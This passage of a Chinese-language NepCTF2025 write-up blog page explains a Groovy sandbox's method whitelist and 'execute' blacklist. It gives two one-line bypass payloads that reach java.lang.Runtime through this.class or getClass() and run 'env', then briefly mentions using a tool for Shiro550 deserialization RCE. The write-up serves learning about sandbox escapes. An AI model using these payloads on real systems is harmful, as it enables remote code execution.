class="type">ClassNode</span> <span class="variable">type</span> <span class="operator">=</span> objectExpr.getType();</span><br><span class="line">                type.getClass();</span><br><span class="line">                <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> type.getName();</span><br><span class="line">                <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> methodCall.getMethodAsString();</span><br><span class="line">                <span class="keyword">if</span> (typeName.equals(<span class="string">&quot;java.lang.String&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (STRING_METHODS.contains(methodName)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot;  on &quot;</span>+ <span class="string">&quot;String is not allowed&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;execute&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Calling &quot;</span>+methodName+<span class="string">&quot; on &quot;</span>+ <span class="string">&quot;is not allowed&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
+
+<p>外层if语句只检查了函数调用表达式<code>something.method()</code>类似的调用，其他类型的表达式都不管</p>
+<p>进入if语句后，会获取调用方法的对象类型，调用方法的名字</p>
+<ul>
+<li>如果我们调用的是String对象的方法，那么就会触发白名单验证，但是这里没有给出来，如果没在白名单里就会抛出异常</li>
+<li>如果我们调用的方法是execute，就会触发黑名单并抛出错误</li>
+</ul>
+<p>上面都没有的话就会返回true</p>
+<h3 id="方法一-属性访问表达式绕过"><a href="#方法一-属性访问表达式绕过" class="headerlink" title="方法一:属性访问表达式绕过"></a>方法一:属性访问表达式绕过</h3><p>其实上面的安全逻辑本来是希望我们只能调用String对象中的方法的，让我们的代码都只能是被当作字符串去调用操作，但是这里明显在外层if语句里存在一个问题，就是这里只检查了函数调用表达式而不管其他类型的表达式</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250726031051869.png" alt="image-20250726031051869"></p>
+<p>然后可以想到，this.class是属于PropertyExpression属性访问表达式，之前在学习java反序列化的时候就接触过，每个java类运行时都会实例化一个 java.lang.Class 的实例。并且例如我们在脚本中调用方法println的话实际上就是在调用this.println()，所以this.class在脚本中实际上就是在访问该类的对象实例，那么就能间接访问到java.lang.Class 的实例，同时也就绕过第一层if，直接返回true了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;env&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二-getClass-方法绕过"><a href="#方法二-getClass-方法绕过" class="headerlink" title="方法二:getClass()方法绕过"></a>方法二:getClass()方法绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;env&quot;</span>).getText()</span><br></pre></td></tr></table></figure>
+
+<p>为什么这里可以呢，其实也很简单，因为这里并不符合内层的两个if语句，既不是String对象的方法，也不是execute方法，所以也就不会触发异常抛出，同样可以返回true</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250726032302337.png" alt="image-20250726032302337"></p>
+<h2 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a>JavaSeri</h2><h3 id="shiro550"><a href="#shiro550" class="headerlink" title="#shiro550"></a>#shiro550</h3><p>感觉被资本做局了，从题目上线到比赛结束，我每次打开环境都是跳转127.0.0.1，不知道为啥，赛后拿朋友开的环境直接就打开了。。。</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250729105943641.png" alt="image-20250729105943641"></p>
+<p>看到一个shiro和remember me，直接猜测是shiro550反序列化，拿工具一把梭吧</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250729110039455.png" alt="image-20250729110039455"></p>
+<p>然后探测利用链并RCE就行了</p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250729223430058.png" alt="image-20250729223430058"></p>
+<p><img src="/../image/achieve/202411/NepCTF2025/image-20250729223648725.png" alt="image-20250729223648725"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyGooGooVVVY"><span class="toc-number">2.</span> <span class="toc-text">easyGooGooVVVY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-bank-%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">safe_bank(复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RevengeGooGooVVVY"><span class="toc-number">4.</span> <span class="toc-text">RevengeGooGooVVVY</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">方法一:属性访问表达式绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-getClass-%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">方法二:getClass()方法绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaSeri"><span class="toc-number">5.</span> <span class="toc-text">JavaSeri</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro550"><span class="toc-number">5.1.</span> <span class="toc-text">#shiro550</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/07/25/NepCTF2025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&text=NepCTF2025"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&is_video=false&description=NepCTF2025"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NepCTF2025&body=Check out this article: https://wanth3f1ag.top/2025/07/25/NepCTF2025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&title=NepCTF2025"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&name=NepCTF2025&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/07/25/NepCTF2025/&t=NepCTF2025"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
